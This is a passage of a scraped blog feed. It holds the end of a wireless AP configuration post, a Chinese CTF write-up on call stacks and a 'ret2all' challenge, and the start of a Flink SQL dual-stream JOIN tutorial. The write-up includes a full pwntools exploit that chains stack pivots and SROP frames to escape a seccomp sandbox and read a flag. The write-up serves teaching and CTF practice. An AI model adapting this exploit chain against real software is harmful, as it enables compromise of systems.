src=\"https://picx.zhimg.com/80/v2-4db7cabce75ef2b2533f253720e2ed0c_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"ap-group\">ap-group</h2>\n<p>将该 ap 移动到该 ap 组中</p>\n<p>ap-group 南苑1D</p>\n<p><img alt=\"\" src=\"https://pic1.zhimg.com/80/v2-56160f63c54a79ccf968620a45d9e0c2_720w.png?source=ccfced1a\" /></p>\n<hr />\n<h1 id=\"总结\">总结：</h1>\n<p>先将旧AP的配置删除，再以AP-Mac创建一个配置。</p>\n<p>进入配置模式后，改名、改AP组等等。</p>\n<p>当state状态为Run，则成功上线。</p>\n<p>当然也可以用其他的办法，可以自行探索。</p>\n<p><img alt=\"\" src=\"https://pic1.zhimg.com/80/v2-6b2b47faa4ee8e7d27266b58d110701b_720w.png?source=ccfced1a\" /></p>\n\n\n</div>\n<div id=\"MySignature\">\n    <p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/boluo0423/\" target=\"_blank\">李菠萝的多样空间</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/boluo0423/p/19620604\" target=\"_blank\">https://www.cnblogs.com/boluo0423/p/19620604</a></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 22:35</span>&nbsp;\n<a href=\"https://www.cnblogs.com/boluo0423\">李菠萝的多样空间</a>&nbsp;\n阅读(<span id=\"post_view_count\">1</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "函数调用栈与Ret2all",
      "link": "https://www.cnblogs.com/firefly-star/p/19620531",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/firefly-star/p/19620531\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 21:19\">\n    <span>函数调用栈与Ret2all</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        The end of 2025 and stack\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"函数调用栈\">函数调用栈</h1>\n<h2 id=\"基础知识\">基础知识</h2>\n<p>寄存器： rip与eip：指令寄存器，cpu会把该寄存器地址内的数据当成指令执行（rip是64位系统的，eip是32位的）<br />\nrsp与esp：栈顶指针寄存器，表明了栈顶的位置<br />\nrbp与ebp：栈底指针寄存器，表明了栈底的位置</p>\n<p>elf文件在外存和内存中的情况如图<img alt=\"2N6XUQJ6L_T(EI3JRXE{)CM\" class=\"lazyload\" /></p>\n<p>最左边的RW与RX就是对应段的权限，R即read，读；W即write，写；x即execute，执行；可以看见外存中的文件最终执行时都会映射到内存中，内存中可以看见栈是由高地址往低地址增长的，堆是由低地址往高地址增长的。下面我们看当我们调用函数时发生了什么。比如如下程序，以64位为例</p>\n<p><img alt=\"84FX7HTTB`D(@VEPZ2NJM5\" class=\"lazyload\" /><br />\n首先看进入函数第一条指令，不是int，而是{，这个会被编译器解释成push rbp，mov rsp rbp，也就是先把rbp入栈，再把rsp抬上来，然后再sub rsp (一个立即数)  把rsp抬上去，效果如图<br />\n<img alt=\"I%EHN9HC59T4)Q@%WW})EK\" class=\"lazyload\" /></p>\n<p>然后是int，int就是声明变量，也就是把变量声明在rbp-多少，接下来继续执行就到了调用这个wow函数的时候了，调用函数时通过call指令，也就是先把当前指令的下一条指令的地址入栈（这个也就是我们常说的返回地址，我用back代替），接下来又进入wow函数的指令，这个函数第一条指令又是{，又把rbp入栈，因为rbp还是原来main函数的rbp，所以rbp1就是指向rbp的，rsp抬到rbp，如图所示<br />\n<img alt=\"S36(WXMSF~`(%EJPQ35B{7\" class=\"lazyload\" /><br />\n接下来又是sub rsp (一个立即数)，把rsp往上抬，然后是int c;声明一个变量c，效果如图<br />\n<img alt=\"6IZ$2H)A7(3{ENKG)8Z_XXX\" class=\"lazyload\" /><br />\n其实栈溢出的原理就是通过往c写值，覆盖栈上的这个返回地址，我们接下来看我们没改返回地址的时候函数返回是怎么返回的，首先有一个leave指令，这个指令就是mov rsp rbp</p>\n<p><img alt=\"E{`R{BSFVR~GAW8LFOTI0\" class=\"lazyload\" /><br />\n然后pop rbp把rsp位置的值弹出栈，赋给rbp，这时rbp已经回到main函数那里了<br />\n<img alt=\"T(6PQG7T_{V_0${C8RB@JD\" class=\"lazyload\" /></p>\n<p>此时并不会直接把上面c变量的数值销毁，而是在将来声明变量时可以再往这声明，leave之后接下来是ret，ret就是pop rip，把wow返回地址赋给指令寄存器，接下来就再跳转过去执行指令。</p>\n<p>这里就可以看出栈溢出的原理了，因为我们往栈上写值是由低地址往高地址写(图中由上往下)，所以只要我们有能写出c这个变量大小的条件，就可以把rbp及返回地址覆盖，接下来就会返回我们写成的返回地址，接下来就会去我们想让他返回的地方执行指令。</p>\n<h2 id=\"rop链原理\">rop链原理</h2>\n<p>其实rop链就是开了栈不可执行(NX保护)时，因为不能直接写汇编指令所以通过一些代码片段(gadget)去控制各寄存器，并通过ret链接起来的指令，比如有一个地址中的地址是pop rdi;ret，那我们返回地址写成这个指令的地址后，他就会执行这个指令pop rdi，然后就是ret，因为rsp没变，所以他还是在栈上取值，所以接下来就由可以填我们想让他返回到的地址了。</p>\n<h2 id=\"栈迁移原理\">栈迁移原理</h2>\n<p>栈迁移简单来说就是控制rsp，主要通过控制rbp然后进行两次leave去控制，第一次leave控制rbp，第二次leave通过控制的rbp进而控制寄存器,下面以迁移到bss段为例，第一次leave;ret:先mov rsp rbp</p>\n<p><img alt=\"C}`79BKB$1RTBYWL$X(QTI\" class=\"lazyload\" /></p>\n<p>pop rbp之后<br />\n<img alt=\"BA`BS9@63E2JK4~}5SDK8L\" class=\"lazyload\" /></p>\n<p>接下来是ret，继续执行返回地址内的指令,至此第一次leave;ret结束。因为返回地址还是leave;ret，所以有第二次leave;ret：<br />\n先mov rsp rbp<br />\n<img alt=\"O2)PBM{2$L9XG@PG71W}}`G\" class=\"lazyload\" /><br />\n接下来是pop rbp然后就是ret，在bss里取值继续执行了。从图中也可以看到，rsp与rbp都被我们控制了，函数的栈已经变化了，所以叫栈迁移。具体的攻击可以看看我之前的文章。<a href=\"https://www.cnblogs.com/firefly-star/p/19407067\" target=\"_blank\">ret2csu与栈迁移的运用</a></p>\n<h2 id=\"栈返回\">栈返回</h2>\n<p>看到这不知道各位有没有想过，既然我们自己定义的函数(这里的例子就是wow)有返回地址，那c语言库里的read，printf，write....等函数有没有返回地址呢，好像没听过？首先，他们也是有返回地址的，因为调用他们也需要call这个指令，这个指令就会把下条指令的地址入栈，只是因为调用他们的时候栈已经类似这个样子了<br />\n<img alt=\"6IZ$2H)A7(3{ENKG)8Z_XXX\" class=\"lazyload\" /></p>\n<p>所以哪怕这时候rsp的地方写了一条返回地址，我们在栈上的局部变量c里写值也是覆盖不到这个地址的，所以一般用不到这个手法。当然既然是一般就有例外，比如格式化字符串可以改printf函数的返回地址，read如果能控制写入的地址也可以改到(也得溢出一次才有可能)</p>\n<h2 id=\"栈对齐的原因及解决办法\">栈对齐的原因及解决办法</h2>\n<p>栈对齐就是为什么有时候我们返回system的时候要加个ret，实际上就是栈没对齐通过加ret对齐。栈对齐就是rsp指针要16字节对齐，因为系统调用的时候要求要对齐，也就是rsp最后一个16进制位要是0。关于这个原因就是个人观点了，我个人理解的应该比较浅，我认为就是系统本身肯定会让rsp对齐以免我们自己调用system函数的时候崩溃，但我们往返回地址后面可能写很多指令的地址，所以就导致了不对齐。解决办法: 因为64位下栈的内存单元是以8为单位的，也就是我们rsp的地址的最后一个16进制只有8和0两种可能，并且正常是rsp的末位8，这样在接下来的system函数里，因为他会push rbp,这样rsp就16字节对齐了，所以我们不对齐就说明rsp的末位是0，这样system函数push rbp之后rsp就是8字节对齐(末位是8了)，这里我们要么选择加一条指令的地址(加ret)要么就把返回地址往后写，跳过push rbp这个指令。不过也有例外，如果我们栈迁移迁到了末尾不是0也不是8的地址，加再多ret也没用，这时候就要修改迁移的位置了。</p>\n<h1 id=\"ret2all\">Ret2all</h1>\n<p>好了你已经学会函数调用栈了，快来写一道栈溢出吧。</p>\n<p><img alt=\"%TEP143FYN0V%}N{MKI\" class=\"lazyload\" /><br />\n这题保护除了canary都开了，第一个init给了我们rbp与ret（这两个在bss段上），ret可以泄露pie基地址，所以pie保护就跟没开一样了，后面用mprotect把bss段设成只读了，并且把标准错误给关了，后面开了沙盒。<br />\n<img alt=\"$S_FMVUJ5RRF65A8ZMR)A\" class=\"lazyload\" /><br />\n把execve，read，write分支都禁了并且下面write的文件描述符只能是2，read的文件描述符只能是0。后面有个栈溢出，溢出0x28字节<br />\n<img alt=\"`V{OT$DH{75328S1WROLI\" class=\"lazyload\" /></p>\n<p><img alt=\"19O3X~YGE8}3XIJ7TQ3IOD\" class=\"lazyload\" /></p>\n<p>这个是影子，首先检测前0x60是不是\"I love you I feel lonely\"字符串，后面检测rbp与ret是不是之前发给我们的，相当于只能溢出0x18了，并且还只能溢出到返回地址+8的位置。不过这里因为他调用了三次函数，所以会leave三次，就有栈迁移的机会，并且在read到0x88的地方正好是rbp最后一次指向的地方，也就是两次leave就到了我们可以控制的地方，我们把写成我们返回地址+8的地址就可以实现一次read了<br />\n<img alt=\"ZOM}~FZ59(@L(2Q)2S\" class=\"lazyload\" /></p>\n<p>但这里要注意，read之后不会直接返回，而是会进影子，所以这里我们read写入的地方有讲究，要能覆盖过我们call read的返回地址，实现栈返回，即往rsp的上方写。<br />\n<img alt=\"4X1(O6@5X$85)}4FHDX(O\" class=\"lazyload\" /><br />\n这里只要覆盖掉rsp就可以逃出影子了，因为目前泄露不出libc，所以只能用栈上现有的libc地址，我们可以找一下附近的，因为我们最多覆盖一字节，因为远程libc基址大部分是000结尾的，我们覆盖一字节是可以确保每次都能利用，如果覆盖两字节就需要爆破凭运气了。<br />\n<img alt=\"CO~10V{RTPYTD0{QIP4$}9\" class=\"lazyload\" /></p>\n<p>这里有一个syscall，但这个syscall不是特别好，因为如果我们用这个syscall调用函数后面有一个jmp，他不是ret，就比较难预测了。所以我们第一次syscall调用srop来控制rbx，之后配合magicgadget改成应该好用的gadget。改好之后就可以调用dup2(1,2)把标准输出的内容复制到标准错误，接下来就可以write泄露libc，有libc之后就先close(0)，让open打开的文件描述符是0，这样read就可以往栈内写flag了，最后再write打印出来flag就结束了。而这就需要我们在syscall下面先布置好srop的SigreturnFrame结构，这里因为长度有限不能用pwntools的函数。只能手搓了。并且要注意一下往下写需要rsp在下面，因为我们read还有影子跟着，所以rsp在下面才能实现栈返回，所以第一次往下写是逃不了影子的，简单来说就是先往下，然后leave上来，再leave下去就好了(这里上下是相对syscall来说的，这是这题最关键的部分）。大概效果是这样<br />\n<img alt=\"SMCYK`YCX%F8JAEDR$QTXAC\" class=\"lazyload\" /></p>\n<p>因为一开始的rbp是定死的，所以我们要注意在第一次的rbp上放好下面的地址就可以了，只要能调出一次srop就好办很多了，srop结构如下<br />\n<img alt=\"QCEGSM~4(_)Y0I3UKO)E38Y\" class=\"lazyload\" /><br />\n这里就是从左往右读，第一个是syscall，第二个是uc_flags第三个是&amp;uc之后依次读下去，大概离syscall0x70的位置是rdi，之后调用完一次srop要往syscall下面一个位置写一个leave，并且这个leave末尾要小于4，因为这样syscall ret之后就是leave，我们只要控制rbp就可以继续控制程序流。之后多布局一下就差不多写完了这题，多调试就好。这里因为我的本地环境跟远程不一样，所以应该是打不了远程的，不过可以参考一下，应该布局上是大差不差了，估计是有些细节不一样。exp如下</p>\n<pre><code>from pwn import *\nimport sys\ncontext.log_level='debug'\ncontext.arch='amd64'\nflag = 0\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',30705)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu():\n\tpay=p64(0)+p64(0)+p64(1)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nru(b'RBP:')\nrbp=int(p.recvline(),16)\nprint(hex(rbp))\nru(b'RET:')\nret=int(p.recvline(),16)\npie=ret-0x1871\nre=pie+0x3FB8\nprbp=pie+0x1253\nmain=pie+0x1874\nmagic=pie+0x1252\ntarget=pie+0x4050\nleave=pie+0x1852\nret1=pie+0x18AC\nread=pie+0x182F\nread1=pie+0x1840\nprint(hex(pie))\npay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x18,read)+p64(rbp-0x10)\ndbg()\nsd(pay)\npause()\npay=flat({\n0x30:p64(rbp+0xc0+0x30),#rbo:0x48\n0x38:p64(read),\n0x40:p64(leave),\n0x48:p64(rbp+0xe0-0x10+0x30),\n0x50:p64(leave),\n0x58:p64(rbp+0xd0+0x30),\n0x60:p64(rbp-0x18),\n0x68:p64(leave),\n},filler=p64(ret1))#flat(prbp,rbp+0x72+8,read)\nsd(pay+b'\\xec')\npause()\npay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x90+0x60,read)+p64(leave)\nsd(pay)\npay=flat({\n0x0:p64(0),#fake\n0x8:p64(0),#rdi\n0x10:p64(rbp+0x30),#rsi\n0x18:p64(rbp+0x28+0x3d),#rbp\n0x20:p64(0x6ede9),#rbx\n0x28:p64(0x200),#rdx\n0x30:p64(0),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x40),#rsp\n0x48:p64(read1),\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(rbp+0x90+1+0x60+0x60),\n0x68:p64(read),\n0x70:p64(rbp+0x20),\n0x78:p64(leave),\n0x80:0,\n})\npause()\nsd(pay)\npay=b'b'*7+p64(prbp)\npause()\nsd(pay)\npay=p64(leave)+flat(ret1)*2+p64(magic)+flat(prbp,rbp+0x59+0x60,read,rbp+0x20,leave,rbp+0x70+0x60,read,read)\npay=pay.ljust(0x60,b'\\x00')+flat({\n0x0:p64(0),#fake\n0x8:p64(1),#rdi\n0x10:p64(2),#rsi\n0x18:p64(rbp+0x100),#rbp\n0x20:p64(0x6ede9),#rbx\n0x28:p64(0x200),#rdx\n0x30:p64(33),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x28),#rsp\n0x48:p64(ret1),\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(0),\n0x68:p64(0),\n0x70:p64(rbp+0x60+0x90),\n0x78:p64(read),\n0x80:0,\n})\nsd(pay)\n\npay=b'b'*7+p64(prbp)\nsd(pay)\n\npay=flat({\n0x0:p64(0),#fake\n0x8:p64(2),#rdi\n0x10:p64(re),#rsi\n0x18:p64(rbp+0x100-0x88),#rbp\n0x20:p64(0),#rbx\n0x28:p64(0x20),#rdx\n0x30:p64(1),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x28),#rsp\n0x48:p64(ret1),#rip\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(rbp+0x90+1+0x60+0x60),\n0x68:p64(read),\n0x70:p64(rbp+0x20),\n0x78:p64(leave),\n0x80:0,\n})\n\nsd(pay)\npay=b'b'*7+p64(prbp)\n\nsd(pay)\nru(b\"Keep it and...I love you\\n\")\n\nlibcbase=u64(rc(6).ljust(8,b'\\x00'))-libc.sym['read']\nre=libcbase+libc.sym['read']\nrax=libcbase+0xdd237\nrdi=libcbase+0x10f75b\nrsi=libcbase+0x110a4d\nend=libcbase+0x98fd5\nrbx=libcbase+0x586e4\nmdx3=libcbase+0xb0133\nprint(hex(libcbase))\npay=b'./flag\\x00\\x00'*2+flat(rdi,0,rsi,rbp+0xd8,rbx,0x1000,mdx3,0,0,0,re)\n\npause()\nsd(pay)\n\nsrop=SigreturnFrame()\nsrop.rax=3\nsrop.rdi=0\nsrop.rsi=0\nsrop.rsp=rbp+0x1e8\nsrop.rip=end\nsrop1=SigreturnFrame()\nsrop1.rax=2\nsrop1.rdi=rbp+0x70\nsrop1.rsi=0\nsrop1.rsp=rbp+0x1e8+0x110\nsrop1.rip=end\nsrop2=SigreturnFrame()\nsrop2.rax=0\nsrop2.rdi=0\nsrop2.rsi=rbp\nsrop2.rdx=0x50\nsrop2.rsp=rbp+0x1e8+0x110+0x110\nsrop2.rip=end\nsrop3=SigreturnFrame()\nsrop3.rax=1\nsrop3.rdi=2\nsrop3.rsi=rbp\nsrop3.rdx=0x50\nsrop3.rip=end\npay=flat(rax,0xf,end)+bytes(srop)+flat(rax,0xf,end)+bytes(srop1)+flat(rax,0xf,end)+bytes(srop2)+flat(rax,0xf,end)+bytes(srop3)\n\nsd(pay)\nti()\n</code></pre>\n<p>这里我用了11次send，跟标答不一样的就是他是泄露libc顺便控制了rdx，之后直接用srop链了，我是没顺便控制rdx，再凑了一下gadget，所以多了一次send。效果如下<br />\n<img alt=\"RRAVM4}FI(AN(G1CJAC_NB9\" class=\"lazyload\" /></p>\n<p>ret2all参考文章<a href=\"https://blog.csdn.net/j284886202/article/details/151363747\" rel=\"noopener nofollow\" target=\"_blank\">ret2all</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 21:19</span>&nbsp;\n<a href=\"https://www.cnblogs.com/firefly-star\">firefly_star</a>&nbsp;\n阅读(<span id=\"post_view_count\">25</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "从零开始学Flink：Flink 双流 JOIN 实战详解",
      "link": "https://www.cnblogs.com/daimajiangxin/p/19620335",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/daimajiangxin/p/19620335\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 16:51\">\n    <span>从零开始学Flink：Flink 双流 JOIN 实战详解</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"从零开始学Flink：Flink 双流 JOIN 实战详解\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/3365149/202602/3365149-20260216165054080-380379392.png\" />\n        通过订单与支付双流关联的实战案例，系统讲解 Flink SQL 中的双流 JOIN 类型、时间条件与实现方式，帮助你理解流计算场景下的关联查询思路和坑点。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在前一篇 <a href=\"https://mp.weixin.qq.com/s/WoY2HukJR5-eD9fRqMi-iQ\" rel=\"noopener nofollow\" target=\"_blank\">《Flink SQL 窗口(Window)操作详解》</a> 中，我们已经打好了时间与窗口的基础。<br />\n但在真实业务里，单条流上的聚合往往只是第一步，更常见的需求是把多条业务流<strong>关联起来一起看</strong>，例如：</p>\n<ul>\n<li>订单流 + 支付流：衡量下单到付款的转化效果</li>\n<li>浏览流 + 下单流：分析从曝光、点击到下单的完整漏斗</li>\n<li>用户行为流 + 用户画像维表：驱动推荐、风控等在线决策</li>\n</ul>\n<p>这些需求背后的共性能力就是：<strong>双流 JOIN</strong>。</p>\n<p>本文以「订单流 + 支付流」为主线，从环境准备、建表、造数到 JOIN 查询，一步步带你搞懂 Flink SQL 中的双流 JOIN 思路与实践。</p>\n<h2 id=\"一双流-join-适用的典型场景\">一、双流 JOIN 适用的典型场景</h2>\n<ul>\n<li>订单与支付关联：找出已下单但未支付、支付失败等情况</li>\n<li>广告曝光与点击关联：计算点击率、转化路径</li>\n<li>日志与告警规则关联：实时检测异常行为</li>\n</ul>\n<p>这些场景有两个共同特征：</p>\n<ul>\n<li>两条都是<strong>事实流</strong>（不断追加的新事件）</li>\n<li>需要在<strong>时间范围</strong>内去匹配事件（谁先发生、允许多长时间内匹配）</li>\n</ul>\n<p>因此在流计算中做 JOIN，一定绕不开<strong>时间字段</strong>和<strong>水位线（Watermark）</strong>。</p>\n<h2 id=\"二flink-中常见的-join-类型\">二、Flink 中常见的 JOIN 类型</h2>\n<p>在 Flink SQL 的流模式下，常见的双流关联方式有：</p>\n<ul>\n<li>普通 JOIN：基于等值条件 + 时间字段的 JOIN</li>\n<li>Interval Join：基于「时间区间」的双流 JOIN</li>\n<li>Temporal Join：一条流 + 维表（变更流）的时态关联</li>\n</ul>\n<p>本篇主要聚焦前两种，更贴近「订单流 + 支付流」这样的事实双流场景。</p>\n<h2 id=\"三准备示例数据表\">三、准备示例数据表</h2>\n<h3 id=\"安装-kafka环境前提\">安装 Kafka（环境前提）</h3>\n<p>在 WSL2 的 Ubuntu 环境中安装并启动 Kafka，请参考 <a href=\"https://mp.weixin.qq.com/s/e0rcME6rVe03uOru386P8g\" rel=\"noopener nofollow\" target=\"_blank\">《从零开始学Flink：数据源》</a>。</p>\n<h3 id=\"安装-flink-kafka-sql-connector\">安装 Flink Kafka SQL Connector</h3>\n<p>需要把 Flink 的 Kafka SQL Connector JAR 包，放到 <code>$FLINK_HOME/lib</code> 目录下。</p>\n<p>以本系列示例使用的 <strong>Flink 1.20.1 + Kafka 3.4.0-1.20</strong> 为例，可以这样操作：</p>\n<ol>\n<li>\n<p>确认你的 Flink 安装目录（假设为 <code>/opt/flink</code>）：</p>\n<pre><code class=\"language-bash\">export FLINK_HOME=/opt/flink\n</code></pre>\n</li>\n</ol>\n<pre><code>\n</code></pre>\n<ol start=\"2\">\n<li>\n<p>下载 Kafka SQL Connector JAR 到 Flink 的 <code>lib</code> 目录：</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME/lib\nwget https://repo1.maven.org/maven2/org/apache/flink/flink-sql-connector-kafka/3.4.0-1.20/flink-sql-connector-kafka-3.4.0-1.20.jar\n</code></pre>\n<p>如果你是 Windows + WSL2，可以在 WSL2 里执行同样的命令；或者用浏览器下载后手动拷贝到 <code>lib</code> 目录。</p>\n</li>\n<li>\n<p>如果你使用的是独立集群或远程集群，需要重启 Flink 集群，让新 JAR 在 JobManager/TaskManager 上生效：</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME\nbin/stop-cluster.sh\nbin/start-cluster.sh\n</code></pre>\n<p>如果只是本地直接运行 <code>bin/sql-client.sh</code> 启动内嵌 mini-cluster，则只需重启 SQL Client 即可。</p>\n</li>\n<li>\n<p>启动 Flink SQL Client，然后执行本文后续的建表与查询示例：</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME\nbin/sql-client.sh\n</code></pre>\n</li>\n</ol>\n<h3 id=\"准备-kafka-中的示例数据表\">准备 Kafka 中的示例数据表</h3>\n<p>我们假设已经从 Kafka 中读取两条流：</p>\n<ul>\n<li><code>orders</code>：订单流</li>\n<li><code>payments</code>：支付流</li>\n</ul>\n<p>并在建表时定义了事件时间和水位线：</p>\n<pre><code class=\"language-sql\">CREATE TABLE orders (\n  order_id     STRING,\n  user_id      STRING,\n  order_amount DECIMAL(10, 2),\n  order_time   TIMESTAMP_LTZ(3),\n  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND\n) WITH (\n  'connector' = 'kafka',\n  'topic' = 'orders',\n  'properties.bootstrap.servers' = '127.0.0.1:9092',\n  'properties.group.id' = 'flink-orders',\n  'scan.startup.mode' = 'earliest-offset',\n  'format' = 'json',\n  'json.timestamp-format.standard' = 'ISO-8601'\n);\n\nCREATE TABLE payments (\n  pay_id     STRING,\n  order_id   STRING,\n  pay_amount DECIMAL(10, 2),\n  pay_time   TIMESTAMP_LTZ(3),\n  WATERMARK FOR pay_time AS pay_time - INTERVAL '5' SECOND\n) WITH (\n  'connector' = 'kafka',\n  'topic' = 'payments',\n  'properties.bootstrap.servers' = '127.0.0.1:9092',\n  'properties.group.id' = 'flink-payments',\n  'scan.startup.mode' = 'earliest-offset',\n  'format' = 'json',\n  'json.timestamp-format.standard' = 'ISO-8601'\n);\n</code></pre>\n<p>有了时间字段和水位线，Flink 才能在流模式下安全地做双流 JOIN，并在「时间窗」关闭后清理状态。</p>\n<h3 id=\"使用-kafka-console-producer-造测试数据\">使用 Kafka Console Producer 造测试数据</h3>\n<p>上面的 DDL 建好了 <code>orders</code> 和 <code>payments</code> 两张表，对应的是 Kafka 中的两个 Topic。接下来我们用 Kafka 自带的命令行工具写入几条 JSON 测试数据。</p>\n<p>假设你已经在 WSL2 的 Ubuntu 中启动好了 Kafka（包括 ZooKeeper 或 KRaft），进入 Kafka 安装目录，执行：</p>\n<p><strong>1. 往订单 Topic 写入数据</strong></p>\n<pre><code class=\"language-bash\">bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic orders\n</code></pre>\n<p>在命令行中输入几条 JSON 数据（按回车发送一条）：</p>\n<pre><code class=\"language-json\">{\"order_id\":\"o_1\",\"user_id\":\"u_1\",\"order_amount\":100.00,\"order_time\":\"2026-02-16T14:41:00Z\"}\n{\"order_id\":\"o_2\",\"user_id\":\"u_2\",\"order_amount\":200.00,\"order_time\":\"2026-02-16T14:42:00Z\"}\n{\"order_id\":\"o_3\",\"user_id\":\"u_1\",\"order_amount\":150.00,\"order_time\":\"2026-02-16T14:45:00Z\"}\n</code></pre>\n<p><strong>2. 往支付 Topic 写入数据</strong></p>\n<p>新开一个终端，同样进入 Kafka 安装目录，执行：</p>\n<pre><code class=\"language-bash\">bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic payments\n</code></pre>\n<p>输入对应的支付 JSON 数据：</p>\n<pre><code class=\"language-json\">{\"pay_id\":\"p_1\",\"order_id\":\"o_1\",\"pay_amount\":100.00,\"pay_time\":\"2026-02-16T14:41:00Z\"}\n{\"pay_id\":\"p_2\",\"order_id\":\"o_2\",\"pay_amount\":200.00,\"pay_time\":\"2026-02-16T14:42:00Z\"}\n</code></pre>\n<p>这里的字段名、时间格式都要和前面建表时定义的一致，这样 Flink 才能正确反序列化 JSON 并进行双流 JOIN。</p>\n<h2 id=\"四基于时间条件的普通双流-join\">四、基于时间条件的普通双流 JOIN</h2>\n<p>先来看最直观的一种写法：同时指定「关联键」和「时间范围」。</p>\n<p><strong>需求：</strong>统计订单在下单后 15 分钟内完成支付的记录。</p>\n<pre><code class=\"language-sql\">SELECT\n  o.order_id,\n  o.user_id,\n  o.order_amount,\n  o.order_time,\n  p.pay_id,\n  p.pay_amount,\n  p.pay_time\nFROM orders AS o\nJOIN payments AS p\nON o.order_id = p.order_id\nAND p.pay_time BETWEEN o.order_time AND o.order_time + INTERVAL '15' MINUTE;\n</code></pre>\n<p><img alt=\"双流join\" class=\"lazyload\" /></p>\n<p>这里有几点非常关键：</p>\n<ul>\n<li><code>o.order_id = p.order_id</code>：以订单号作为两条流的业务主键</li>\n<li><code>pay_time BETWEEN order_time AND order_time + INTERVAL '15' MINUTE</code>：明确限定“下单后 15 分钟内支付”这类时间约束</li>\n<li>使用事件时间字段配合水位线，可以在保证计算正确性的前提下控制状态大小，并处理一定范围内的迟到数据</li>\n</ul>\n<p>如果你希望保留那些<strong>下单了但超时未支付</strong>的记录，可以将上面的 <code>JOIN</code> 改为 <code>LEFT JOIN</code>，然后在下游以 <code>p.pay_id IS NULL</code> 作为“未支付/超时”的判断条件。</p>\n<h2 id=\"五interval-join显式时间区间的双流-join\">五、Interval Join：显式时间区间的双流 JOIN</h2>\n<p>普通 JOIN 中的时间条件本质上就是一种「区间约束」。<br />\n在 Flink Table API 中，有一个更明确的概念：<strong>Interval Join</strong>。</p>\n<p>等价的 Interval Join 写法大致如下（Table API 伪代码，仅作为概念理解）：</p>\n<pre><code class=\"language-sql\">SELECT\n  o.order_id,\n  o.order_time,\n  p.pay_id,\n  p.pay_time\nFROM orders AS o\nJOIN payments AS p\nON o.order_id = p.order_id\nAND p.pay_time BETWEEN o.order_time AND o.order_time + INTERVAL '15' MINUTE;\n</code></pre>\n<p>无论是普通 JOIN 还是 Interval Join，本质上都是：</p>\n<ul>\n<li>以某个时间字段作为「对齐基准」</li>\n<li>设定一个前后允许的时间区间</li>\n<li>在这个区间内匹配到的记录会输出为 JOIN 结果</li>\n</ul>\n<h2 id=\"六迟到数据与状态清理\">六、迟到数据与状态清理</h2>\n<p>在流式 JOIN 中，最容易被忽略但又非常重要的一点就是：<strong>状态会不断累积</strong>。</p>\n<p>Flink 会根据时间条件和水位线来决定：</p>\n<ul>\n<li>某条历史事件是否还有可能再匹配到另一条流的事件</li>\n<li>超出时间范围且水位线已推进时，可以安全地清理对应状态</li>\n</ul>\n<p>设计双流 JOIN 时，建议考虑：</p>\n<ul>\n<li>时间窗口不要设置得过大，否则状态会膨胀</li>\n<li>根据业务的真实延迟来设置水位线与时间区间</li>\n<li>对于极端迟到的数据，是丢弃、旁路输出，还是通过补偿机制处理</li>\n</ul>\n<h2 id=\"七一个完整的小结\">七、一个完整的小结</h2>\n<p>通过本文，你需要记住下面几点：</p>\n<ul>\n<li>双流 JOIN 场景非常常见，本质是两条事实流在时间上的匹配</li>\n<li>流式 JOIN 一定要依赖<strong>事件时间 + 水位线</strong>来控制状态和迟到数据</li>\n<li>常见的方式包括基于时间条件的普通 JOIN 和 Interval JOIN</li>\n<li>设计时间区间时，要在「业务容忍度」和「资源消耗」之间做权衡</li>\n</ul>\n<p>在下一篇中，我们可以继续围绕「实时数仓」或「维表时态 Join」展开，把事实流与维度数据关联起来，构建更真实的 Flink SQL 实战项目。</p>\n<hr 